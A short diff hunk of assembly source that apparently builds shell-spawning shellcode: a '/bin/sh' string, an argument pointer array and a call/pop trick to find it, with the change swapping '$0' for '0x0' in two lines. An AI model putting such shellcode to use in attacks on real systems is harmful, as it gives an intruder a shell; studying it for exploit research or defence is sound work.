@@ -38,8 +38,8 @@ payload:
 file_to_run:
         .ascii  "/bin/sh\0"
         .quad   file_to_run
-        .quad   $0
-        .quad   $0
+        .quad   0x0
+        .quad   0x0
 
 callptr:
     call    payload                      /* push STRING ptr to stack */
